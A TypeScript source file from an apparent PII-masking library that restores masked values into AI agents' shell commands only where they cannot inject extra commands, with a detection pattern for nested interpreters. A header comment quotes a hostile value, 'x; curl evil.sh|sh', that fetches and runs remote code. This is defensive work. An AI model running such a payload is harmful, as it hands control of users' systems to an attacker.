// SPDX-License-Identifier: Apache-2.0

import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'nullpii';

/**
 * Shell-aware restore for the tool calls whose input a shell runs.
 *
 * A masked value comes from data the model could not read: a file the
 * agent opened, a tool result. Put back verbatim into a shell command, it
 * can change what the command does. A "secret" that reads
 * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
 * command once restored. So in the `command` of a shell tool, each
 * placeholder gets its real value back only when that value is safe where
 * the placeholder stands; otherwise it stays literal, and the command
 * works on the placeholder text, which is harmless.
 *
 * Where it stands, in order:
 * - a command that hands code to another interpreter (`bash -c`, `eval`,
 *   `ssh`, `python -c`, `| sh`, `awk`, …): the strictest rule everywhere;
 * - the body of a heredoc fed to `cat` or `tee`: literal with a quoted
 *   delimiter (`<<'EOF'`), expanding like double quotes with a bare one;
 *   a heredoc fed to anything else may be code (`python3 - <<'EOF'`) and
 *   gets the strictest rule;
 * - otherwise the shell quoting: single quotes, double quotes, backslash
 *   escapes, and command substitutions (`$(…)`, backticks), which are
 *   unquoted even inside double quotes.
 *
 * Same rule as the Claude Code mod (`shellContextAt` in its
 * `hooks/policy.ts`), with these differences: heredoc bodies are skipped
 * by the quote lexer (an apostrophe in a body does not open a quote for
 * the rest of the command); `<<` counts only in shell code, never inside
 * quotes or as the here-string `<<<`; a heredoc without its closing line
 * gets the strictest rule; only `cat` and `tee` heredocs count as data;
 * and the interpreter list also covers `| sh` and the awk/sed family.
 *
 * Best effort: no list names every program that runs its input as code.
 */

/** Anthropic tools (by exact name) whose input a shell runs. */
export const ANTHROPIC_SHELL_TOOLS: ReadonlySet<string> = new Set(['Bash']);

/** OpenAI-style agents also name their shell tool `bash` or `shell`. */
export const OPENAI_SHELL_TOOLS: ReadonlySet<string> = new Set(['Bash', 'bash', 'shell']);

/** The input field of a shell tool that the shell interprets. */
export const SHELL_COMMAND_FIELD = 'command';

export type QuoteContext = 'none' | 'single' | 'double' | 'heredoc';

/** What a value may contain to be put back where its placeholder stands:
 * it must not add commands, expand anything, or end its quotes. */
const SHELL_SAFE: Readonly<Record<QuoteContext, RegExp>> = {
  none: /^[A-Za-z0-9@%+=:,./_-]+$/,
  single: /^[^'\n]*$/,
  double: /^[^"$`\\!\n]*$/,
  // A quoted-delimiter heredoc body is literal; only a newline could end
  // it early, with the delimiter on a line of its own.
  heredoc: /^[^\n]*$/,
};

/** Programs that run part of their arguments, or what is piped to them,
 * as code: a value safe for the outer shell can still inject into them.
 * The first four alternatives are the Claude Code mod's list. */
const NESTED_INTERPRETER = new RegExp(
  [
    /\b(?:bash|sh|zsh|dash|ksh|fish)\s+(?:-\w+\s+)*-\w*c\b/.source,
    /\beval\b|\bssh\b|\bsu\s+-c\b/.source,
    /\b(?:python3?|node|perl|ruby|php|deno|bun)\s+(?:-\w+\s+)*-\w*[ce]\b/.source,
    /\|\s*(?:sudo\s+)?(?:bash|sh|zsh|dash|ksh|fish|python3?|node|perl|ruby|php|deno|bun)\b/.source,
    /\b(?:awk|gawk|mawk|nawk|sed)\b/.source,
  ].join('|'),
);

/** A heredoc operator, read at one position: `<<` or `<<-`, then a
 * delimiter that is quoted (`'EOF'`, `"EOF"`), backslash-escaped (`\EOF`)
 * or bare (`EOF`). Groups: 1 dash, 3 quoted word, 4 escaped word, 5 bare. */
const HEREDOC_OPERATOR = /<<(-?)[ \t]*(?:(['"])([A-Za-z_]\w*)\2|\\([A-Za-z_]\w*)|([A-Za-z_]\w*))/;

/** Commands whose heredoc body is data, not code. */
const HEREDOC_DATA_COMMANDS: ReadonlySet<string> = new Set(['cat', 'tee']);

/** Characters after which a new simple command starts. */
const COMMAND_SEPARATORS: ReadonlySet<string> = new Set([';', '&', '|', '\n', '(', '{']);

const ENV_ASSIGNMENT = /^[A-Za-z_]\w*=/;
const LEADING_TABS = /^\t+/;

type FrameKind = 'code' | 'subst' | 'backtick' | 'single' | 'double' | 'body';

/** Shell code, where quotes, substitutions and operators mean something. */
const CODE_KINDS: ReadonlySet<FrameKind> = new Set(['code', 'subst', 'backtick']);

/** One level of shell nesting. `body` is an unquoted heredoc body: it
 * expands `$` and backticks like double quotes, but `"` is literal. In a
 * code frame, `cmdStart` is where the current simple command began, and
 * `depth` counts the `(` opened inside a `$(…)`. */
interface Frame {
  readonly kind: FrameKind;
  depth: number;
  cmdStart: number;
}

/** A heredoc whose body starts at the next newline of shell code. */
interface Heredoc {
  /** `undefined` when the delimiter could not be read. */
  readonly delimiter: string | undefined;
  /** Quoted or escaped delimiter: the body is literal. */
  readonly literal: boolean;
  /** `<<-`: leading tabs are stripped from the closing line. */
  readonly stripTabs: boolean;
  /** Fed to `cat` or `tee` and not piped on, so the body is data. */
  readonly data: boolean;
}

/** Where a newline with pending heredocs leads: into the body holding the
 * target index, or past every body to `next`. */
type BodyScan = { readonly context: QuoteContext } | { readonly next: number };

/** True when `name` is one of `shellTools`. */
export function isShellTool(name: unknown, shellTools: ReadonlySet<string>): boolean {
  return typeof name === 'string' && shellTools.has(name);
}

/** True when `value` can be put back as written in `context`. Outside a
 * heredoc body, a value starting with `-` is never safe: quoted or not,
 * the command it lands in would read it as an option (`rm '-rf'`). */
export function shellSafe(value: string, context: QuoteContext): boolean {
  if (context !== 'heredoc' && value.startsWith('-')) return false;
  return SHELL_SAFE[context].test(value);
}

/**
 * The context that decides what a restored value may contain at `index`
 * of a shell command: the strictest rule when the command hands code to
 * another interpreter, else the heredoc body or the shell quoting there.
 */
export function shellContextAt(command: string, index: number): QuoteContext {
  if (NESTED_INTERPRETER.test(command)) return 'none';
  return lex(command, 0, index, { kind: 'code', depth: 0, cmdStart: 0 });
}

/** Lex `command` from `start` to `index`, with `base` as the nesting in
 * force at `start`, and return the context at `index`. */
function lex(command: string, start: number, index: number, base: Frame): QuoteContext {
  const stack: Frame[] = [base];
  const pending: Heredoc[] = [];
  let i = start;
  while (i < index) {
    const frame = stack.at(-1) ?? base;
    if (command[i] === '\n' && pending.length > 0 && CODE_KINDS.has(frame.kind)) {
      const scan = readHeredocBodies(command, i + 1, index, pending);
      if ('context' in scan) return scan.context;
      pending.length = 0;
      frame.cmdStart = scan.next;
      i = scan.next;
      continue;
    }
    i += advance(stack, frame, pending, command, i);
  }
  const kind = stack.at(-1)?.kind;
  if (kind === 'single') return 'single';
  if (kind === 'double' || kind === 'body') return 'double';
  return 'none';
}

/** Read the token at `i`, update the nesting, return its length. */
function advance(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
): number {
  const ch = command[i];
  if (frame.kind === 'single') {
    if (ch === "'") stack.pop();
    return 1;
  }
  if (ch === '\\') return 2;
  if (ch === '$' && command[i + 1] === '(') {
    stack.push({ kind: 'subst', depth: 0, cmdStart: i + 2 });
    return 2;
  }
  if (ch === '`') {
    if (frame.kind === 'backtick') stack.pop();
    else stack.push({ kind: 'backtick', depth: 0, cmdStart: i + 1 });
    return 1;
  }
  if (frame.kind === 'double') {
    if (ch === '"') stack.pop();
    return 1;
  }
  if (frame.kind === 'body') return 1;
  return advanceCode(stack, frame, pending, command, i);
}

/** One token of shell code: the top level, or inside a substitution. */
function advanceCode(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
): number {
  const ch = command[i];
  if (ch === '<' && command[i + 1] === '<') return readHeredocOperator(command, i, frame, pending);
  if (ch === "'") stack.push({ kind: 'single', depth: 0, cmdStart: 0 });
  else if (ch === '"') stack.push({ kind: 'double', depth: 0, cmdStart: 0 });
  else if (frame.kind === 'subst') trackParens(stack, frame, ch);
  if (ch !== undefined && COMMAND_SEPARATORS.has(ch)) frame.cmdStart = i + 1;
  return 1;
}

function trackParens(stack: Frame[], frame: Frame, ch: string | undefined): void {
  if (ch === '(') frame.depth += 1;
  if (ch !== ')') return;
  if (frame.depth === 0) stack.pop();
  else frame.depth -= 1;
}

/** Record the heredoc whose operator starts at `i`; return its length.
 * `<<<` is a here-string: the word after it is an ordinary argument. */
function readHeredocOperator(command: string, i: number, frame: Frame, pending: Heredoc[]): number {
  if (command[i + 2] === '<') return 3;
  const operator = new RegExp(HEREDOC_OPERATOR.source, 'y');
  operator.lastIndex = i;
  const m = operator.exec(command);
  if (m === null) {
    pending.push({ delimiter: undefined, literal: false, stripTabs: false, data: false });
    return 2;
  }
  const newline = command.indexOf('\n', i);
  const restOfLine = command.slice(i, newline === -1 ? command.length : newline);
  const word = commandWord(command.slice(frame.cmdStart, i));
  const quoted = m[3] ?? m[4];
  pending.push({
    delimiter: quoted ?? m[5],
    literal: quoted !== undefined,
    stripTabs: m[1] === '-',
    data: HEREDOC_DATA_COMMANDS.has(word) && !restOfLine.includes('|'),
  });
  return m[0].length;
}

/** The program a simple command runs: its first word that is not an
 * environment assignment, without a directory (`/bin/cat` → `cat`). */
function commandWord(text: string): string {
  const word = text
    .trim()
    .split(/\s+/)
    .find((w) => !ENV_ASSIGNMENT.test(w));
  return word?.split('/').at(-1) ?? '';
}

/** Walk the bodies of the heredocs that start at `start`, in order. */
function readHeredocBodies(
  command: string,
  start: number,
  index: number,
  pending: readonly Heredoc[],
): BodyScan {
  let bodyStart = start;
  for (const heredoc of pending) {
    const end = findClosingLine(command, bodyStart, heredoc);
    // An unreadable delimiter or no closing line: the body's extent, and
    // so what follows it, is unknown.
    if (end === undefined) return { context: 'none' };
    if (index < end.bodyEnd) return { context: bodyContext(command, bodyStart, index, heredoc) };
    bodyStart = end.next;
  }
  return { next: bodyStart };
}

function bodyContext(
  command: string,
  start: number,
  index: number,
  heredoc: Heredoc,
): QuoteContext {
  if (!heredoc.data) return 'none';
  if (heredoc.literal) return 'heredoc';
  return lex(command, start, index, { kind: 'body', depth: 0, cmdStart: 0 });
}

/** The body's end (start of the closing line) and where shell code
 * resumes (the newline after it), or `undefined` when there is none. */
function findClosingLine(
  command: string,
  start: number,
  heredoc: Heredoc,
): { bodyEnd: number; next: number } | undefined {
  if (heredoc.delimiter === undefined) return undefined;
  let lineStart = start;
  while (lineStart <= command.length) {
    const newline = command.indexOf('\n', lineStart);
    const lineEnd = newline === -1 ? command.length : newline;
    const line = command.slice(lineStart, lineEnd);
    const candidate = heredoc.stripTabs ? line.replace(LEADING_TABS, '') : line;
    if (candidate === heredoc.delimiter) return { bodyEnd: lineStart, next: lineEnd };
    if (newline === -1) return undefined;
    lineStart = newline + 1;
  }
  return undefined;
}

/** A shell command with its safe placeholders restored. */
export interface ShellRestore {
  readonly command: string;
  /** One result per placeholder restored, or found unknown or foreign
   * (left literal, and counted as such by the caller). */
  readonly results: readonly RestoreResult[];
  /** The placeholders left literal because their value was not safe
   * where they stand, once per occurrence. Placeholders, never values. */
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders in a shell `command`, each only when its real
 * value is safe in the context at its position (`shellContextAt`).
 * Contexts are read on the command as received: a value restored there
 * never ends its quoting or its heredoc, so it cannot change the context
 * of a later placeholder.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellCommand(
  np: RestoreCapable,
  command: string,
  sessionId: string,
): ShellRestore {
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  let out = '';
  let last = 0;
  for (const match of command.matchAll(placeholderPattern())) {
    const start = match.index;
    const placeholder = match[0];
    const r = np.restore(placeholder, sessionId);
    const safe = r.replacements === 0 || shellSafe(r.restored, shellContextAt(command, start));
    if (safe) results.push(r);
    else keptMasked.push(placeholder);
    out += command.slice(last, start) + (safe ? r.restored : placeholder);
    last = start + placeholder.length;
  }
  return { command: out + command.slice(last), results, keptMasked };
}

/** How many placeholders `text` holds. */
export function countPlaceholders(text: string): number {
  return [...text.matchAll(placeholderPattern())].length;
}

/** A fresh global copy: `matchAll` needs the `g` flag, and a shared
 * global regex would carry `lastIndex` between callers. */
function placeholderPattern(): RegExp {
  return new RegExp(PLACEHOLDER_REGEX.source, 'g');
}
